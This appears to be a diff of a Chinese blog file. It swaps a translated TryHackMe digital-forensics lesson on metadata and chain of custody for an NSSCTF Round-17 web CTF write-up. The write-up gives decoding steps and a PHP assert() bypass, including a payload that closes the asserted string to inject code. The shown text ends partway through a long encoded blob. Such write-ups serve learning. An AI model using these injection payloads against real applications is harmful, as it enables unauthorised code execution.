class="line">私营部门调查是由公司机构进行的调查，通过分配一个私人调查员，无论是内部还是外包。它们是由企业政策违规引发的。</span><br><span class="line">无论是调查犯罪还是企业政策违规，一部分证据与数字设备和数字媒体有关。这就是数字取证发挥作用并尝试确定发生了什么事情的地方。没有经过训练的数字取证调查员，将无法正确处理任何数字证据。</span><br></pre></td></tr></table></figure>
-<h4 id="Digital-Forensics-Process">Digital Forensics Process</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">作为数字取证调查员，你到达了类似上图所示的现场。作为数字取证调查员，你应该做什么？在获得适当的法律授权后，基本计划如下：</span><br><span class="line"></span><br><span class="line">1. 获取证据：收集数字设备，如笔记本电脑、存储设备和数码相机。（需要注意的是，如果笔记本电脑和计算机正在运行，它们需要特殊处理；然而，这超出了本房间的范围。）</span><br><span class="line">2. 建立证据保管链：适当填写相关表格（样本表格）。目的是确保只有授权调查人员能够访问证据，没有人可以篡改它。</span><br><span class="line">3. 将证据放入安全容器：你要确保证据不会被损坏。对于智能手机，你要确保它们无法访问网络，以防止远程擦除。</span><br><span class="line">4. 将证据运输到你的数字取证实验室。</span><br><span class="line"></span><br><span class="line">在实验室里，流程如下：</span><br><span class="line"></span><br><span class="line">1. 从安全容器中取出数字证据。</span><br><span class="line">2. 创建证据的取证副本：取证副本需要使用高级软件来避免修改原始数据。</span><br><span class="line">3. 将数字证据放回安全容器：你将在副本上工作。如果你损坏了副本，你可以随时创建一个新的副本。</span><br><span class="line">4. 开始在你的取证工作站上处理副本。</span><br><span class="line"></span><br><span class="line">上述步骤已经改编自《计算机取证和调查指南》第6版。</span><br><span class="line"></span><br><span class="line">更普遍地说，根据前国防计算机取证实验室主任Ken Zatyko的说法，数字取证包括：</span><br><span class="line"></span><br><span class="line">1. 正确的搜索授权：调查人员不能在没有适当的法律授权的情况下开始工作。</span><br><span class="line">2. 证据保管链：这是必要的，以便随时了解谁持有证据。</span><br><span class="line">3. 使用数学验证：使用一种特殊类型的数学函数，称为哈希函数，我们可以确认文件没有被修改。</span><br><span class="line">4. 使用经过验证的工具：数字取证中使用的工具应该经过验证，以确保它们能正常工作。例如，如果你正在创建磁盘的映像，你希望确保取证映像与磁盘上的数据完全相同。</span><br><span class="line">5. 可重复性：只要具备适当的技能和工具，数字取证的发现就可以被复现。</span><br><span class="line">6. 报告：数字取证调查以一份报告结束，展示了与案件相关的发现的证据。</span><br></pre></td></tr></table></figure>
-<h4 id="Practical-Example-of-Digital-Forensics">Practical Example of Digital Forensics</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们在数字设备上所做的一切，从智能手机到计算机，都会留下痕迹。让我们看看如何在后续的调查中利用这一点。</span><br><span class="line"></span><br><span class="line">我们的猫，Gado，被绑架了。绑匪给我们发送了一份请求的文档，格式为MS Word文档。我们已经将文档转换为PDF格式，并从MS Word文件中提取了图像以方便您查看。</span><br><span class="line"></span><br><span class="line">您可以下载附件到本地计算机进行检查；但是，为了您的方便，我们已将文件添加到AttackBox中。要跟随操作，请在AttackBox上打开终端，然后转到如下所示的目录。在以下终端输出中，我们更改了包含案例文件的目录。/root/Rooms/introdigitalforensics</span><br><span class="line"></span><br><span class="line">终端</span><br><span class="line">root# cd /root/Rooms</span><br><span class="line">root# cd introdigitalforensics</span><br><span class="line">root# ls</span><br><span class="line">letter-image.jpg  ransom-letter.doc  ransom-letter.pdf  ransom-lettter-2.zip</span><br><span class="line">文档元数据</span><br><span class="line">当您创建一个文本文件时，操作系统会保存一些元数据，例如文件创建日期和上次修改日期。但是，如果您使用更高级的编辑器，例如MS Word，则文件的元数据会保留许多信息。有各种方法可以读取文件元数据；您可以在官方的查看器/编辑器中打开它们，也可以使用适当的取证工具。请注意，将文件导出到其他格式（例如）将保留原始文档的大多数元数据，具体取决于所使用的PDF编写程序。TXTPDF</span><br><span class="line"></span><br><span class="line">让我们看看我们可以从PDF文件中了解到什么。我们可以尝试使用程序读取元数据。Pdfinfo显示与PDF文件相关的各种元数据，例如标题、主题、作者、创建者和创建日期。（AttackBox已经安装了；但是，如果您使用的是Kali Linux并且没有安装，请使用安装。）考虑以下使用的示例。.pdfinfopdfinfopdfinfosudo apt install poppler-utilspdfinfo DOCUMENT.pdf</span><br><span class="line"></span><br><span class="line">终端</span><br><span class="line">user@TryHackMe$ pdfinfo DOCUMENT.pdf </span><br><span class="line">创建者:        Microsoft® Word for Office 365</span><br><span class="line">生产者:       Microsoft® Word for Office 365</span><br><span class="line">创建日期:   Wed Oct 10 21:47:53 2018 EEST</span><br><span class="line">修改日期:        Wed Oct 10 21:47:53 2018 EEST</span><br><span class="line">标记:         yes</span><br><span class="line">用户属性: no</span><br><span class="line">嫌疑人:       no</span><br><span class="line">表单:           none</span><br><span class="line">JavaScript:     no</span><br><span class="line">页数:          20</span><br><span class="line">加密:      no</span><br><span class="line">页面大小:      595.32 x 841.92 pts (A4)</span><br><span class="line">页面旋转:       0</span><br><span class="line">文件大小:      560362 字节</span><br><span class="line">优化:      no</span><br><span class="line">PDF版本:    1.7</span><br><span class="line">PDF元数据清楚地显示了它是使用MS Word for Office 365于2018年10月10日创建的。</span><br><span class="line"></span><br><span class="line">照片EXIF数据</span><br><span class="line">EXIF代表可交换图像文件格式；这是一种将元数据保存到图像文件中的标准。每当您使用智能手机或数码相机拍照时，都会嵌入大量信息到图像中。以下是原始数字图像中可能包含的元数据示例：</span><br><span class="line"></span><br><span class="line">相机型号/智能手机型号</span><br><span class="line">图像捕获的日期和时间</span><br><span class="line">照片设置，例如焦距、光圈、快门速度和ISO设置</span><br><span class="line">由于智能手机配备有GPS传感器，因此在图像中找到嵌入的GPS坐标的可能性很高。 GPS坐标，即纬度和经度，通常会显示拍摄照片的地点。</span><br><span class="line"></span><br><span class="line">有许多在线和离线工具可用于读取图像的EXIF数据。其中一个命令行工具是。 ExifTool用于读取和写入各种文件类型的元数据，例如JPEG图像。（AttackBox已经安装了；但是，如果您使用的是Kali Linux并且没有安装，请</span><br><span class="line"></span><br><span class="line">使用安装。）在以下终端窗口中，我们执行了以读取此图像中嵌入的所有EXIF数据。exiftoolexiftoolexiftoolsudo apt install libimage-exiftool-perlexiftool IMAGE.jpg</span><br><span class="line"></span><br><span class="line">终端</span><br><span class="line">user@TryHackMe$ exiftool IMAGE.jpg</span><br><span class="line">[...]</span><br><span class="line">GPS位置: 51度31&#x27;4.00&quot; N，0度5&#x27;48.30&quot; W</span><br><span class="line">[...]</span><br><span class="line">如果您将上述坐标搜索到在线地图上，您将了解有关此位置的更多信息。在Microsoft Bing Maps或Google Maps中搜索，会发现这些坐标表明该图像是在伦敦博物馆附近拍摄的。 （我们只替换了以使我们的搜索起作用。）我们注意到坐标在搜索页面上被转换为十进制表示：.51° 31&#x27; 4.00&quot; N，0° 5&#x27; 48.30&quot; Wdeg°51.517776, -0.09675</span><br><span class="line"></span><br><span class="line">使用或任何类似的工具，尝试找出绑匪拍摄其附加到文档中的图像的地点。街道的名称是什么？exiftool</span><br></pre></td></tr></table></figure>
-<p>这边给了例题，主要就是查找基本的exif信息，除了上述给出的工具，直接用010手撸都行，最简单的misc</p>
+    <title>NSSCTF Round-17 Basic-Writeup-Web</title>
+    <url>/2024/02/21/NSSCTF%20Round-17%20Basic-Writeup-Web/</url>
+    <content><![CDATA[<h1>NSSCTF Round-17 Basic-Writeup-Web</h1>
+<h2 id="前言">前言</h2>
+<p>一次很难评的周赛，web里藏misc，准确来说藏musc，何必呢？</p>
+<h2 id="web">web</h2>
+<h3 id="真·签到">真·签到</h3>
+<p>查看robots.txt页面可以发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hint:E794A8E688B7E5908DE7869FE68289E590972CE696B0E7949FE8B59BE58FAFE98187E8A781E8BF87E593A67E0AE8AEB0E5BE97E794A8E688B7E5908DE585A8E794A8E5B08FE58699E593A6EFBD9EEFBD9E</span><br><span class="line">username:13 44 21 15 42</span><br><span class="line">password:LF5GY3KZKRVTCT2EM54FUV2FO5GVIVLZJZ5GW6C2IRJGQTT2KU2VUR2GNJNEIYZVLJDVKPI=</span><br></pre></td></tr></table></figure>
+<p>解密得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#base16</span><br><span class="line">hint:用户名熟悉吗,新生赛可遇见过哦~</span><br><span class="line">记得用户名全用小写哦～～</span><br><span class="line">#敲击码</span><br><span class="line">username:C(K)TFER-&gt;ctfer</span><br><span class="line">#base32 base64 md5</span><br><span class="line">password:c9fa95881ea0152791d4a759dacd79de(Nss)</span><br></pre></td></tr></table></figure>
+<p>登录后查看前端</p>
+<p><img src="https://s2.loli.net/2024/02/21/lfz4DquXpoyHBvP.png" alt="NSSCTF Round"></p>
+<p>然后是一个弱类型问题</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>] == <span class="number">732339662</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;is_numeric(<span class="subst">$_GET</span>[nss])==0&quot;</span>) || <span class="keyword">die</span>(<span class="string">&#x27;oops!此路不通！！&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;这里不是说了吗！！！必须是 732339662 (招新群群号！)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;啊？这是什么新型比较？&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;是不是题错了啊&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>两种思路，分别讲述一下</p>
+<p>首先都是先传入数字732339662，过第一个if，然后assert函数，内部为真继续，为假结束</p>
+<p>逻辑或||的运算规则是一个为真即为真，后续不再计算，一个为假再计算右边的表达式，但是由于存在die函数，如果前面整体为真即可过，如果为假，后续进入die函数直接结束了。</p>
+<p>因此我们可以的办法就是令整体为真，此时如果传入的Nss不是字符串，则is_numeric为假=0，此时左边整体为真。</p>
+<p>此时PHP的版本是7.2.34，猜测是这个原因，所以常规的%0a%00绕过均失效，最终可用的来源于,</p>
+<p><a href="https://www.bilibili.com/read/cv20228698/">记周赛遇到的一个is_numeric问题 - 哔哩哔哩 (bilibili.com)</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?nss=732339662,1</span><br></pre></td></tr></table></figure>
+<p>这是一种解法，还有一种思路值得参考，通过闭合绕过，因为存在die函数会直接结束进程，所以将其闭合即可，并且后面的直接注释掉即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?nss=732339662a;)//</span><br></pre></td></tr></table></figure>
+<h3 id="真的是文件上传吗？">真的是文件上传吗？</h3>
+<p>先来看一下按照本题预期（应该</p>
+<p>最开始页面上是这个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">++++++++[&gt;&gt;++&gt;++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++++&gt;++++++++++++++++&gt;++++++++++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++++++++&gt;++++++++++++++++++++++++&gt;++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;-------.&gt;-.++++++.&lt;&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;++.&lt;++++++++.&gt;---------.++++++.&lt;&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;+++++++.+.+++++.&gt;.&lt;&lt;&lt;-.&lt;&lt;&lt;------.&gt;&gt;&gt;++++++++.&gt;&gt;-----.&gt;++.&lt;----.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;++++++++.--------.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;----.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;+++++.++++++.-----------.++++++.&lt;&lt;&lt;&lt;+....&lt;.&gt;&gt;&gt;------.&gt;&gt;+++++++.----------.&lt;&lt;&lt;&lt;-.&gt;&gt;&gt;&gt;&gt;+++.----------.++++++.&lt;&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;++.&lt;+++++.+++..&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;----.-------.&gt;-.&lt;.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;+++++++.+.+++++.&gt;--.&lt;&lt;&lt;&lt;&lt;+.</span><br></pre></td></tr></table></figure>
+<p>brainfuck解密</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You want a hint?</span><br><span class="line">Give me a flag!!!!</span><br><span class="line">And you will hava hint!</span><br></pre></td></tr></table></figure>
+<p>然后get传入一个flag参数，即将迎来极其无语的一点，嵌套了n层的base，如果这是misc，我无话可说，但是这个是web，只能说一个6</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5Zac5qyi5oiRV0TnmoRiYXNl5ZCXCj0obCNhLVpeRFBCT3I7dURlczYuRzxaRUEzW1x1KUYpIzVnLFhRSFZFLiZybTdWIjg8ME8tRzRGP2BCQjVxWUpcMWhLWzcvMXQ/bEBuJnNgLnNhKkY4NTFGVTtGclFdN1JDLUFDMXA0PjFlVHFrQDhKUlNFYz4+bjVVbktLNTxWK2wsckFwcDNfaiRPPUFnUEQ0XSxyQ0FwQGQpPGJZWmE2OjxfMTgxODRKNCo9dDsvcFY+OS40ODs4NSdlbmZCTiRObzU7UWJFNUAtV2gzYjszJUYmdVs4NVl0Y3I2Nm91RzVASFdmLT06KDg+QS4+TTRFIiM+MTQ7NXEzXmtuUDc5O2ohNTpwRGU3NipHVC44VlpnNVljPkM8Xjl0TzE0OzVkLldSNCksQ0VJMj1AdGMhNSNgZSktPUt0UTNJRyRmPF1FXTgxNDIyUTRZJ2hiPlVXby8uIW9LSDVYQExxPz9lKGkwLyQ3IjVWa19aM2I8SjQ0KGc2Y0BUY1RBO2BbXWU1J0xAJTMtbydeL29QJywuISUoaDVDLVVaNXVNLGEsQFlSSDxDOXRfOFBoKlxBb3FUXTc2T2QlRC1vXDM0JVc9XDBOKTFdLjU9a048YChKIzRaNWYwMkQ/akIsQmQ6LTU6JWdLM14+QjY0WzFZVTppME5TLjhPI20xaFQ8U0IuLEgtRClQVT08Xy1bTzVUcjozNCllTF01PUpeakUkZUBzNVRzbzkuOEYvcy47MyRrLm9CO0ExNDs4OjUlUVRhMC4wLyQuVEJEOzFJNE4lQDc7ZVo1Qz9UYDVCXj09Nm9KXmA8QFY5PDc5Kko/NjZuY0Q1JzgvYUYnVUNSRiY1dDJEJ2g4OjU/cDlMNSQxbG5AVlRkWS45QiJpNVg/XStAOEpYUC9qTkdyNUB1Vzk0YGtqRjVzWzRsM1xGX2A0RCVmIjUkTFE0NXNuXk0vb3Q7Y0UoK00jMTQqQTU0KDtIL0dyQlJwPEM6MjM0PidvZDVCJ2VGNzlhRz0tdTs6WDRFIiw2QXBaNCkuNjE5UjxAZ09DNTxyK28vUyYwRixCQCFGNFoiSHQ1VTk2RDY+XiImQkw/Kjc8YWV1YDVVUzcrLjo0YEI5NSU2cS45Ql8qM15jIzRCTCNsWSxYYmNgNjZvdUU1QEkpbDUkJzRDLD4yP002Nm9aITgxSF0wNCktRHI3OTtqITUiSypRNzY8U1FBcFowWjNFOilDRC5tYzQ5TzllW0A2XCRbLENFSTJEQ2UxYjU8MHVEMG1QVHMzXyE0Ni45QU4kN3FIQzc0JyxgNzxfPzdyNUEiNF81WEBMYTUjWDBaM15jSjREQ1NJNTFJM2BCNCheMGE1Wmg+OTtgUy9TNVg4WF8yY0YzNzNcIkdcPUU/MEQxM3RXUzV1TSxzNzowc2c8LFl0dThQYUlzQktdcCgvbm9FQzxhbkknNCVWLlJBcGRtNCw7RSVePGAoSis1XCJPXS9TJFBgPlZvXGc0RDhJazVDSThpM1xpRjE6aWZvKTxAXy11MUk0TjE/Ujc/UURHYVZaLjdjajEzWz9rMDQpSFpGNVtkZjJFJF09RjVAJS9LNUNIVS41Qz9aYy5WKUZmNVhJUFA1JVFBcTkvQXRGNlNWU0E4cCMySUA2bE1WNzlzcFc1QG1WaTNGP1BcQDY2LEZAVWBQYS5uV1RjNSc4UydGJ0M3UzNdOjpuLjxtakg1P3A8MjQpLmkrLjhPN3QuISYhNzUnVDFJNXVmWCsvak5fbzVVbktTNGBqcHQ0KEwnJDNdOWxLRENbbms1WCROLjJDcj5jL28rYFtFKCsyTjFJNUFNNCg7X25HckJSczxEdW10ND4oQHRBbyheNDc2PjNgPEdQQlI0RSJPTkFwbEArLjUscDI8QFVtVTUkTHA0L1MvQzM+Vjk4WC05dFsmN3FiZToxZlExYTppVUQuPEBfJykzXj4hLC46NGBCMiojLEEuOjY6MjNiOj9VRDBCNT8sVyZoPEUkXExVNUAlUG01Q0ciZzVcalNINXNKJ3A4MT9XLzUkOWBoNUM/YVw1IksrIjc2RVlTP0AiN3EzY1MxXkQuWltbNm9JLCtANlwnREJNVlRKPF8saDo1J15DOTppbkU6M14tW241QSE7bDVYbSY8NCcsYDc+VksmZDxJQF5pNSdTQWg1I2ozazFoVDxTRENdJEs2ImFNTzVzbT5FQG1YS0Y7YElabDUnTEAlNCkmMVA3N0NGJy1yT0BwMTNtL1AzXGlLcjFnWEt1PEUhKnA0PihiRUIuUGhpNzY9Rj88YW5JRjQlV2ErQXBkbGgsO0U1SDtgWzxJNFlKKnMvUyRcWyxDM1IxNVYiLWszXyooRDRbMVpBOmo2Miw8QF85MTFoSzZXP1I3RV1EKT5JPS43W1pjNVwhO1w1VnVlJjVVOUpeRSRbO0k1WEpAQS44RXJPNzdVWnVEYTZMNjgxSF1ANSVJbzQ5L0F0QjxAXyc9OHAjMklAN2kxJDNeUXNyPF08ZlYzRj9vKzxAZmUoLjdtVEwubk1yVDUnODJfRidVQ1UzXUxBTy45QU4mNT9xbyY0WiJjWEBWVDN1LXJOUUs1J1xHYT8/QG5nL2pPO1U1QHVXOTRdP04lN1hIZ2A3UStRcjREJWxBNVgkTWI0WV4jSC9wQ1NnRSgrOz8xSU9lYTQpLzshR3FzOnA8QzoyNThQYFc5NUFqXmQ3UCZJMjxHYiRAM2I7NiRCLUFzJS41LHAyPEBVbVU1JExwJDBOMjdwPlY5OFgtPUwrNTNfISJgMWZRLyY+Vjk+NC46NigxM187JVEuNlVwXjk1JTZxLjhPLyIzXmNEV0JMSC9gQGsoZXFFJFxMWTVASSY9LW4tV1E1XSdoNzRFIjUjODFbWHA1VHFkLjc5O2ohNSM+Nls3Nk4+QkA2bFA7M18hLjM8XjopMjlPO0Y1QDZcJSlCT2soXzYkUDImNTwwdWQtPVNmUTNcRmM3LjVyazc3cXM+ZzQrL2g8MC8kNEIuIW84XTVYP10zNSNqPFwxaFQ8UC42J1hANVhBWEg0KGc4azdRK1VEREJpSVg1J0xeRDJjRWRTPkIhbW4uISUoajVYOSgiNXQ+P2g3OCVQUzxFISpaOFBfSCJBbmllazc2PkVDPGApN3Q0JVhRaDBOKTFdLDtFRys8YChKJzRZSipiMUkzbEgsQyFIcjREOElrM15kXiszXGlCXzpqJCYqPEBfOTIzYjpmYC45QTJzREdPSlcuN2NjXDVAJDxSQkxqajQ1WXRVITY3IjYyNSdeJGY1VHFoLzU/VjwsRGE+W1o4MUhdQDUkOWFVOS9BdEY2VEouSTc2NVFfQDZaQVQ1Qz9bVDVBYTF1NTxXZEA8QFRZKUBWU2RnLm5NclU1JzhTLDppXDBGM106MicuNXM3WzU/cDwyNCcqcSJAVmVxWS5UQj1pNSdVZyM/P0BuZy9qPS9TNVVuSHM0YGo0bDxAJ0BUN1ErLldEQldhQzVYZTN1NChfUGo3Nk9wRS5ybldnMUk1ODc0KDtfbkYnTlc9PEM5WXM0XSxySDVBam1dOTRobTw8YW5ANjQ+J1FEQXBkbGk1VHRBOjxfbFYmNTxyKy4vUy9DMz5WOThYLTl0WyY1VUBcITFpaz9FPlYnYm0uOUJNKTQ9akJILjo0YFIyKiMsQS42aDhuNVRxaDBCTTJZZ0BrKHFjRENcXl01QElLOTV0Mz4yNV0nX0Y8QVI/ITgxW1hwNVY2NVQ1Qz9kRTxeOitCNzYzTVE/P2UsOzNjVDBgPF08b2k5ZDtfdUYnMTFcQk1WVy48XyxHJzUnXkMpOmlmcWczXTo+OTVBIV06NVVJZHE0JyxtNjxfPzgvLiEmcEA4UFVSSTV1VEJsMU8pPCE1VWZNZDRdNVc0NChnNmNAU3BUMzthRmk8NVg4W0UyY1g/OTpmcHBZLXJPPyExM20vKzV0Pj9nRigmQXU8Qzl0SThQZ145QXBlL1U3Nj0rKUQtb1xENCVYUXBBcGRsWCw6UUpWPGApN3A0WjVldTJEP3QwLEItayc1OiVeWTNfMy5FM2AlUE86ajYyLDxBUk4+MWhLNlc/UjdFXjk0aENNLjhPODY1W3VpWj9TRjAtNUInYj9FJGQxYTVUcyNlNUNHIlU8XWpdITY2cEFxODFIX0o1JVFCXDVCcUghPGRAXDc4MUdvZEA3O2VaNzlOWVE1Ql49PTZvSj9yPEBUWSlCS29SLC45S0FtNSc4Uyw6aW48RkYmNjBsLXJOJnU1P3FvJjQnKm48MWhmPyouISVtbDUnTGEiPz9ScWcvajtbNTxdRGciNF0+XTU3WEhncDNcRl9eREJXPTA1J0w9OkFwbXUxL3BDU2I8RSFGMjFGLG1dNXNKVWdHcmU8PzxDOjsmODFJbmdBbmtVWDc5YUorPGFuSSczW0BYOEFwZGxYLjhhX048QFVtWDVcPG9BME1zTkA+QUBJaDRZb0JHN3FiZToxaWNrcj5WOW5vLjo2KDE1VVM5NS45ZUhOMiojLEEuN1tTazVUcyQ8QkwjbFxAayhxY0UkXExPNUBJR081dDM+Mjc8RGpDNj1pYlA4MVFjMTY+XEEoNUJwSVg1Iz42cjc2PjQsQDZsUFw1VTpAbjxeOXQ5OU87RjVDZlhoS0JLJm4yLjlKdTg1PFc3UzBtUXRcOmZMT2kuNXMmITdxcz5nNCsvZUk8Xz84LS42aC0iNiJfS1o1dWZXXy44TkgtLjYnWEA1J1VkQTQoXjBiQFNwSyY7YUUtLTVYOFgnMmNPOTc+QiFuWj1FQGJyMTNtL0w1dD4/aD5DKDNDPEM5dF84UGdeOUJMUUp1NzY8bkc8YW5JMDQlWFFoME4pMW4sO0VJZTxAZmFaNVw8TVMwTidgST5WXU4iNSQ7X0w1VTk2JzNcaUYxOmlmbyo8QF8tdTFJNE4xLjlBKi05NSVPTC43Y2NgM0Y9Z1M1dHRXWjVZdFR1RSRkMWM1QCUvSzVDRyJVNUFGTFFEYT5bWjgxSF1INSVJbkk3OTxlPzZTVyJUODFBW1FANylZWDVZYjZPNUFqYjU0QUtaTjxAVFkpQktvUiwuOUtBbTUnOFBWLT04QV8zXUxGcC5XJUJzNT9xbyY0WXAyLkBWUzpXLjZnXXM1J1NBYDVDInRNL2o9L1M1QSI0VzRgajRsNXNbNG1AU3AkOi05ImgmNVhlNDAuV0pyRy9vK2BbPER0RDYxSTViazQoOzh1RicqPzs8Qzo7JDQ9amNdQW8oYVo3OWFKKkQuYlBMNEUiLDZCLUFzNzU7Uk9LPGAqJ1I1JExzIi9TLVZRPkFARD4tPUwiRzFGLGprMWlrP0VCTD9aOy44TnIhNVVTOTUuOUEwOjIqIyxBLjdbU2s1VHMkPEQwZk1GQGsocWE8QF8nQjVAJXU8NXQ1MDk1XSdfSjVzSidwODFBN141VjY1VTVDLFw+NSJLKlE4MT9XQz9AIjRLM2NUMGI1QG1gLDZvSSwrPEBCUC1CTGMpYTxfLERyNTxXN1MwbVA2RjNeLVk9LjV0JUk3cUZlSzQnKyRsPGAyaDMuIW82JjUnU0FoNSNqM2sxaGZsW0RDZSskNiJhT000KFUqYUBUY1lhO2FFLS41J0xAJTJEQVZnPkIhblo9RUBicDEzbS9MNVY2RE03OCQhcTxITU9tND4vIWBCS11vbTc2PWdiRC1dc100JVdfKTJDTWo5LDpRbCM8YCk3ZzRaNjJCME4nYEwsQyFGLzU6JV5ZM18zLkU2P3Q7KzppQlpVLjhOaS4xaEs2Vz9SL11LRiQ8ZkwuN1tmVjVYSU09NVcoOE41WXRUdTREL0pUNVhKQEE1VHFqOjc8RGpINXNLMTY3cU9rODUlSi86OmkvVTA2U1ZTMTgxSSwjQDcpWVg3OU5ZUTVBIjIpNm9KP3I8QEJSZzc5KkFNLjlLQW01JzhWKjppbjxGNzhJMzQuNXM3WjdxSEVyNFoiZj4xaGY/Ki1yTlFLNSdVZyM/P0BuVy9qTl9vNUB1VFA1J15LXDVzZDpdM1xGPEQtOSM0UTVDK1lIMkRKTW8vcENTZ0UoK00kNVRzSzo1c0pbMkdxczpwPEM5dEg1J15GWDVzZDRhN1AmN048R1BCVjQlV0BeQi1BcyUuNSsmOTxAZ09GNTxyK18vUyYuKT5BUkxvLT1LMl43cWJlOjFpY2tyOmlUY2c8X3VkTzVVUzcrNVUucS0yKiNBSy43W2hyM15ja1lEMEI1QkBrKE0+NiRRZ0o1QCYldDQpJDBPNzxEYVI2Nm9RMTgxUWMxNVRxZG83OSpXOzVwb3RgNzY+NCtCTEZMRTNfIS4zNUBtVzk5TztGNUNmWGVFQFNwKkY8XyxoOTU8MHVUMG1QSnVCTGMvc0RDXD1DN3FzPlY0JypuPT5VV0toLjV0QDY1WEApQTUjWDBaMU8pRGFEQ10kSzU8VV9KNCheMGJAbVhObTtgSVpzNVg4VUEyREpcZz5CIW1zRCdncmExM20vTDVyQ01HPkMmWWE8RSEqbzhvbUtpQkwiMHAvbm1eXjxgKTd0NCVWcTkwTT0qKCw7RTVIPGAoSjY1JExORjBOKUEmLEJSLis1VTEjKjNeZFwuNj90NDM6aiQmKjxfdXQ4MkQ3UiI/Ujc/UURHT0pYLjdbaSE1PFYmNzV0dFdaNVtkZjFFJGQxYzVAJS9LNVRxaC81P2g+UERhN2BNN3FPaSY1JUluSTc5PGU/NlNXIlQ4cCMySUA3KVlYNzlOWVE1QG1WbTRBS1dQQDZIOEhCS29XTC45S0FoNSc4Vio6aW48SDNdOjVNLjxtakM1P3A8MjUkMW9UQFZBLlUuNmdgVTUnVHQ5Pz9Abmcvak5fbzxgaCVvNGBqNGw3WEhqRjdRKy5XO2BJWlQ1WGUzdTVzbl5eMC5VPHFFKCtEMTFJIzVLNXNKaiwxaDFHWzxFIUY0ND4nb19BbmthKzVUc2lARC1nWGQ0PidKYDBOMjdOLjhQNDc8YCE0PDUkTHJWL1MtVlE+Vjk4WC06JnFrN3FiZUoxaWNrckYnPEhUPD9rTCE1VVNaRy42VXMzNVl1L20uOE8uczVYSStrRDBJWy41WDhzUzY2b1EqNUAldTw1dDUwKjVcalw1NjZvOFgxNDNlRjVWNjVVNUMtVVk1cHAraTc2M09zQDZsTGozY1MxXkQubWM5M0JxNFhDZlc4OEJMYyRCPF8saEk1PFc3Uy1uLXVvM18hNEUuNXNqYDVYbSY8NFlwQ2o8Xz86XTxJQG5SN1VJSFc1I1gnaTFoZmxbRENdJEs2ImFPTTQoOW1dN1ErSW07YElUPjVYOFslMkRKXGg+QiFxPy1yTz8hMTNtL0w1dD4/aDc4JCFxPEZmPCw4UGFJc0JNYDgrNzY9Z2JELV1zXTQlWDBGME4pMV0sO0VHKzxgKTdfNFo2MkI0KS1UbyxCLWsnLTl1RHQzXyooRDRbMWJnPF8/WFo8X3VkczFoQjBWP1I3RklER09KVzxgKTdjNVt1aVlCLzs1OTVYOEllNEQtaiU1VHMkMC44RXI+NT9WPCxEYTgsZTE0PGtHNSVKLzo5L0F0Rj0maVs3NzY1MDVANmxNVjAuVSdiNUBtVm00QUtRcDxAZmUrQktvV0w1ViNXVzUnOFQsRidDQERCSzlAQS41czdbNVhtJUg0WiJjWEBWVGRZLjVzYjE1J1VnI0A4SlhQL2pOYFU1QHVXOTRdPl01NChMJD4zXEY/KDREJWw5NUMrWUg1c25eTS9vdDtjRSgrJlsxNDxNMzQpLzshR3JCUnI8Qzo7PDQ+J29fQktlKC83OWFSbTxHYi0xND4nUURBcGxAKy42MTQxPEBnT0I1PHIrby9TJFJtLEJAIUY0RSlUWzdxYmUpNj90N1lCTD9cbDxfdWROM187RmMuOWVITjIqI0o9LjlCdC01VHJSOkRCVz1DQGsoTT42JFFnSDVASSlsNXQzPjI1XSdfRjY2b1ExODFRYzEyQ0w0LDVCcElXNXBvdSE3Nj40LEA2bFMhNVR0LmtELlpdaTlPOWVbQ2ZYaGksQV4+IjYkUUMhNTwwdUQwbVBCLjNJNGRpLjVzST03cUZlVzQnLGA3PlVXS2guIW84XTc2M09nNSNYMFoxTylEYURCVmgtNF0/SyM0KEwkXzVaaD8mO2BJVD41WDhSRzJjTzk3PkIhcUR